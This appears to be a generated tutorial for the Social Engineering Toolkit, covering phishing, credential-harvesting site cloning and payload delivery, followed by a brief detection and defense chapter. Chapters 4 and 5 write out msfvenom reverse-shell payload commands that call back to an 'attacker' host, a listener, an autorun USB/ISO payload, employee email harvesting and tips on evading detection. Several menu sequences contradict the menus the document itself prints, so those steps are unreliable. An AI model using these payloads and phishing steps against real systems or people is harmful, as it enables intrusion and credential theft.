---
tool_name: "setoolkit"
display_name: "Social Engineering Toolkit (SET)"
mitre_tactic: "initial_access"
mitre_tactic_id: "TA0001"
mitre_subcategory: "social_engineering"
install_command: "sudo apt install set"
version: "0.7.4"
github_repo: "https://github.com/trustedsec/social-engineer-toolkit"
kali_tools_page: "https://www.kali.org/tools/set/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["social-engineering", "phishing", "payloads", "attacks"]
related_tools: ["gophish", "king-phisher", "setoolkit"]
---

# Social Engineering Toolkit (SET)

## Chapter 1: Introduction & Overview

### What is SET?
The Social Engineering Toolkit (SET) is a Python-based tool for performing social engineering attacks. It includes numerous attack vectors including phishing, credential harvesting, and payload generation.

### History & Background
- **Created:** 2010 by TrustedSec
- **Maintained:** TrustedSec
- **License:** GNU General Public License v3
- **Purpose:** Social engineering attacks

SET is the industry standard for social engineering testing.

### When to Use This Tool
- **Penetration testing:** Social engineering assessments
- **Red team operations:** Phishing campaigns
- **Security awareness training:** Test employees
- **CTF challenges:** Social engineering scenarios

### Key Concepts
- **Phishing:** Deceptive emails/websites
- **Credential Harvesting:** Stealing login info
- **Payloads:** Malicious code
- **Pretexting:** Creating fake scenarios

### Attack Vectors
| Vector | Description |
|--------|-------------|
| **Spear-Phishing** | Targeted email attacks |
| **Website Attacks** | Credential harvesting |
| **Infectious Media** | USB/CD attacks |
| **Arduino** | Hardware attacks |
| **SMS Attacks** | Text message phishing |
| **QR Code** | QR code phishing |

---

## Chapter 2: Installation & Setup

### System Requirements
- **Disk Space:** ~500 MB
- **Privileges:** User-level (some features need root)

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install set
```

#### Method 2: From Source
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip install -r requirements.txt
```

### Verification
```bash
setoolkit --version
```

---

## Chapter 3: Basic Usage

### First Attack

#### Start SET
```bash
setoolkit
```
**Explanation:** Opens interactive menu.

#### Quick Attack
```bash
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
# 5) Enter target URL
```

### Essential Commands

#### Start SET
```bash
setoolkit
```
**Explanation:** Opens SET interactive menu.

#### Command Line Mode
```bash
setoolkit -p "payload" -t "target" -o "output"
```
**Explanation:** Runs SET in command line mode.

### Menu Structure

#### Main Menu
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
```

#### Social-Engineering Attacks
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell Execution Attack Vector
11) Third Party Modules
```

#### Website Attack Vectors
```
1) Java Applet Attack Method
2) Credential Harvester Attack Method
3) Tabnabbing Attack Method
4) Web Jacking Attack Method
5) Multi-Attack Web Method
```

---

## Chapter 4: Intermediate Usage

### Advanced Attack Techniques

#### Spear-Phishing
```bash
# 1. Select Spear-Phishing
setoolkit
1

# 2. Select attack vector
2  # Website Attack Vectors

# 3. Select method
3  # Credential Harvester

# 4. Select site cloner
2  # Site Cloner

# 5. Enter IP for POST back
setoolkit
# Enter attacker IP

# 6. Enter URL to clone
# https://target.com/login
```

#### Website Cloning
```bash
# Clone a website
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
2  # Credential Harvester
2  # Site Cloner
# Enter target URL
```

### Scripting & Automation

#### Batch Attacks
```bash
#!/bin/bash
# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe

# Start listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST attacker; set LPORT 4444; exploit"
```

#### Python Scripting
```python
#!/usr/bin/env python3
import subprocess

def create_payload(payload_type, lhost, lport, output):
    """Create payload with msfvenom"""
    cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output}"
    subprocess.run(cmd, shell=True)

# Create payload
create_payload("windows/meterpreter/reverse_tcp", "192.168.1.100", "4444", "payload.exe")
```

### Combining with Other Tools

#### With Metasploit
```bash
# Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe

# Start listener
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST attacker; set LPORT 4444; exploit"
```

#### With Gophish
```bash
# Use SET for payload generation
# Use Gophish for phishing campaign
```

### Advanced Configurations

#### Custom Templates
```bash
# Create custom phishing template
# Edit /usr/share/set/src/web_attack/site-cloner/

# Add your HTML/CSS/JS files
```

### Performance Optimization

#### Email Campaigns
```bash
# Use mass mailer
setoolkit
1  # Social-Engineering Attacks
5  # Mass Mailer Attack
# Configure email settings
```

---

## Chapter 5: Advanced Usage

### Advanced Attack Techniques

#### Infectious Media
```bash
# Create autorun.inf
[autorun]
open=payload.exe
icon=icon.ico

# Create ISO
genisoimage -o media.iso -R -J payload.exe autorun.inf
```

#### QR Code Attacks
```bash
# Generate QR code
setoolkit
1  # Social-Engineering Attacks
9  # QRCode Generator
# Enter URL
```

### Integration in Pentest Workflow

#### Phase 1: Reconnaissance
```bash
# Gather employee emails
theharvester -d target.com -b google

# Create target list
cat emails.txt > targets.txt
```

#### Phase 2: Campaign
```bash
# Configure SET
setoolkit

# Select appropriate attack
# Configure settings
# Launch attack
```

#### Phase 3: Exploitation
```bash
# Collect credentials
# Monitor connections
# Document findings
```

### Advanced Configurations

#### Custom Payloads
```bash
# Create custom payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o custom.exe

# Use with SET
setoolkit
1  # Social-Engineering Attacks
4  # Create a Payload and Listener
# Select payload type
```

### Performance Optimization

#### Stealth Mode
```bash
# Use custom templates
# Avoid common detection
# Rotate infrastructure
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge
**Objective:** Get credentials

**Steps:**
```bash
# 1. Clone login page
setoolkit
1  # Social-Engineering Attacks
2  # Website Attack Vectors
2  # Credential Harvester
2  # Site Cloner
# Enter URL

# 2. Start listener
# 3. Send phishing email
# 4. Collect credentials
```

### Scenario 2: Penetration Test
**Objective:** Test employee awareness

**Steps:**
```bash
# 1. Configure SET
setoolkit

# 2. Create phishing campaign
1  # Social-Engineering Attacks
5  # Mass Mailer Attack

# 3. Send emails
# 4. Monitor results
# 5. Report findings
```

### Scenario 3: Red Team Operation
**Objective:** Social engineering assessment

**Steps:**
```bash
# 1. Research targets
# 2. Create pretext
# 3. Configure SET
# 4. Launch campaign
# 5. Collect data
# 6. Report findings
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect SET

#### Email Indicators
```
# Suspicious sender
# Generic greeting
# Urgency language
# Suspicious links/attachments
```

#### Web Indicators
```
# URL mismatch
# Certificate warnings
# Unusual page content
```

### Mitigation Strategies

#### Email Security
```bash
# Implement SPF/DKIM/DMARC
# Train employees
# Use email filtering
```

#### Web Security
```bash
# Use browser warnings
# Implement CSP
# Monitor for phishing
```

### Blue Team Response
1. **Train employees** - Security awareness
2. **Implement email security** - SPF/DKIM/DMARC
3. **Monitor for phishing** - Alert on attempts
4. **Use browser protection** - Block malicious sites
5. **Report incidents** - Document attempts

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Module not found"
**Cause:** Missing dependencies
**Solution:**
```bash
# Update SET
setoolkit
4  # Update SET

# Install dependencies
pip install -r requirements.txt
```

#### Error: "Permission denied"
**Cause:** Insufficient permissions
**Solution:**
```bash
# Run with sudo
sudo setoolkit

# Or fix permissions
sudo chown -R $USER ~/.set
```

### Performance Optimization

#### Slow Loading
```bash
# Update SET
setoolkit
4  # Update SET

# Reinstall
sudo apt install --reinstall set
```

### FAQ

**Q: Is setoolkit legal to use?**
A: Yes, SET is a legitimate security testing tool. However, using it for unauthorized attacks is illegal. Always get written permission before testing.

**Q: How do I update setoolkit?**
A: `sudo apt update && sudo apt upgrade set`

**Q: Can I use SET for phishing?**
A: Yes, SET includes phishing attack vectors.

**Q: How do I create custom payloads?**
A: Use msfvenom to create payloads.

**Q: Can I automate SET attacks?**
A: Yes, SET supports command line mode and scripting.

---

## Resources

### Official Documentation
- [SET GitHub](https://github.com/trustedsec/social-engineer-toolkit)
- [SET Documentation](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

### Tutorials
- [SET Tutorial - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/social-engineering)
- [SET Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Social-Engineering.md)

### Related Tools
- **Gophish:** Phishing framework
- **King Phisher:** Phishing toolkit
- **Evilginx2:** Advanced phishing
- **Modlishka:** Reverse proxy phishing

### Practice Resources
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [GoPhish](https://getgophish.com/)
